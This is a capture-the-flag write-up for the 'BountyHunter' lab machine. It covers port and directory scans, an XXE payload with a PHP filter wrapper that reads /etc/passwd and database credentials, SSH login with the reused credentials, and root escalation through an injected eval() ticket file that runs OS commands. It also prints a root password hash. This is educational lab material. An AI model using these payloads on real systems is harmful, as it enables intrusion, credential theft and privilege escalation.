# BountyHunter - XXE | Sudo

# Enumeration

```other
⛩\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open 10.129.156.6
Nmap scan report for 10.129.156.6
Host is up (0.39s latency).
Not shown: 64344 closed ports, 1189 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports are open on target machine.

![Screen Shot 2021-07-28 at 22.46.33.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/3F736FB7-92AE-4419-9535-2A109757C139/465925A8-AE1E-431E-8191-9D8C348726D3_2/Screen%20Shot%202021-07-28%20at%2022.46.33.png)

Nothing interesting on homepage.

![Screen Shot 2021-07-28 at 22.47.04.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/3F736FB7-92AE-4419-9535-2A109757C139/AFC96559-A86A-448C-8E72-C2460E8A4DAE_2/Screen%20Shot%202021-07-28%20at%2022.47.04.png)

Portal page is under development and there’s another link to test bounty tracker.

![Screen Shot 2021-07-28 at 22.48.30.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/3F736FB7-92AE-4419-9535-2A109757C139/56C712ED-9284-4DC9-B071-6DBC921783EA_2/Screen%20Shot%202021-07-28%20at%2022.48.30.png)

![Screen Shot 2021-07-28 at 22.49.07.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/3F736FB7-92AE-4419-9535-2A109757C139/D6DA9744-08B5-456E-874C-AE26856EFE15_2/Screen%20Shot%202021-07-28%20at%2022.49.07.png)

No database is present, so it’s just displaying the input text.

![Screen Shot 2021-07-28 at 22.51.20.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/3F736FB7-92AE-4419-9535-2A109757C139/6DBA14F2-EC64-4B65-9CE7-49A69AFDBC9F_2/Screen%20Shot%202021-07-28%20at%2022.51.20.png)

intercept the request in burp and we’d see encoded data. Let’s decode it via cyberchef tool.

![Screen Shot 2021-07-28 at 22.56.30.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/3F736FB7-92AE-4419-9535-2A109757C139/DBAA3221-3AA2-4B97-BC6E-CB04D72299AA_2/Screen%20Shot%202021-07-28%20at%2022.56.30.png)

The data is encoded in base64 and url. The output is in XML format. So, we can try XXE Injection attack.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/3F736FB7-92AE-4419-9535-2A109757C139/481B233C-5617-4606-B790-41F987214B7D_2/Image.png)

Let’s try to read the password file.

![Image.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/3F736FB7-92AE-4419-9535-2A109757C139/741DD2E7-E578-48C1-81E4-2FB69F0B429A_2/Image.png)

We can read local files via XXE. I tried to read SSH keys of ‘development’ user but it didn’t work. Let’s find any interesting files via directory bruteforce.

```other
⛩\> gobuster dir -u http://10.129.156.6 -b 403,404 -t 30 -w ~/tools/SecLists/Discovery/Web-Content/raft-small-words.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.156.6
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /home/kali/tools/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/07/29 06:48:01 Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 309] [--> http://10.129.156.6/js/]
/css                  (Status: 301) [Size: 310] [--> http://10.129.156.6/css/]
/assets               (Status: 301) [Size: 313] [--> http://10.129.156.6/assets/]
/db.php               (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 25169]
/resources            (Status: 301) [Size: 316] [--> http://10.129.156.6/resources/]
/.                    (Status: 200) [Size: 25169]
/portal.php           (Status: 200) [Size: 125]
```

DB file looks interesting and the size is 0, perhaps we can read it via XXE attack. For this we have to use PHP wrapper, the reason behind this is, we do not know the path of db.php file, it can be anywhere. Using PHP wrapper we can read present working directory files, if we know the filename.

![Screen Shot 2021-07-29 at 00.02.45.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/3F736FB7-92AE-4419-9535-2A109757C139/CD4D97C9-0EEB-41ED-8EDC-27C9F2527FA8_2/Screen%20Shot%202021-07-29%20at%2000.02.45.png)

[CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgYmFyIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1kYi5waHAiPiBdPgoJCTxidWdyZXBvcnQ%2BCgkJPHRpdGxlPiZiYXI7PC90aXRsZT4KCQk8Y3dlPjEzMzc8L2N3ZT4KCQk8Y3Zzcz4xMzM3PC9jdnNzPgoJCTxyZXdhcmQ%2BMTMzNzwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg)

![Screen Shot 2021-07-29 at 00.03.06.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/3F736FB7-92AE-4419-9535-2A109757C139/ADE241F4-5AB9-45B2-89E6-8CED39E9ED51_2/Screen%20Shot%202021-07-29%20at%2000.03.06.png)

We got the response, lets decode it.

![Screen Shot 2021-07-29 at 00.03.55.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/3F736FB7-92AE-4419-9535-2A109757C139/B78879F9-C53F-492F-9BD5-8C59FA655D39_2/Screen%20Shot%202021-07-29%20at%2000.03.55.png)

[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=UEQ5d2FIQUtMeThnVkU5RVR5QXRQaUJKYlhCc1pXMWxiblFnYkc5bmFXNGdjM2x6ZEdWdElIZHBkR2dnZEdobElHUmhkR0ZpWVhObExnb2taR0p6WlhKMlpYSWdQU0FpYkc5allXeG9iM04wSWpzS0pHUmlibUZ0WlNBOUlDSmliM1Z1ZEhraU93b2taR0oxYzJWeWJtRnRaU0E5SUNKaFpHMXBiaUk3Q2lSa1luQmhjM04zYjNKa0lEMGdJbTB4T1ZKdlFWVXdhRkEwTVVFeGMxUnpjVFpMSWpzS0pIUmxjM1IxYzJWeUlEMGdJblJsYzNRaU93by9QZ289)

We got the creds of database. However, database port is not exposed to the world. Let’s try this cred with ‘development’ user. We got this user information from reading /etc/passwd file previously.

```other
⛩\> ssh development@10.129.156.6
development@10.129.156.6's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

development@bountyhunter:~$ id
uid=1000(development) gid=1000(development) groups=1000(development)

development@bountyhunter:~$ cat user.txt
229647ceba92196d90a3fffe2fd8dede
```

We got access to user and read the user flag.

# Privilege Escalation

```other
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

We can run python binary as root with a python file. Let’s read the file.

```python
development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

The script asks for the local file and it only accepts .md extension. Then it evaluates for certain variables, based on that we can create a script to read root flag

```python
development@bountyhunter:~$ cat ex.md
# Skytrain Inc
## Ticket to root
__Ticket Code:__
**102+ 10 == 112 and __import__('os').system('cat /root/root.txt') == False
```

```shell
development@bountyhunter:~$ sudo python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
ex.md
Destination: root
02f1ef0872d3f6e3c9a7b6b9e4f038c0
Invalid ticket.
```

We got the root flag. We can replace the cat command with bash to gain root shell access.

```other
root@bountyhunter:/home/development# cat /etc/shadow
root:$6$S6D08T6aUYoEjKkH$aL7HVCr1HUlObuXmxFaXrmYgO3Bn0DwYnefBPI/ATF/At/0eplm9xBfsRoFo8NnlWFeIBzmBivxSfFtAUyfp9.:18793:0:99999:7:::
```

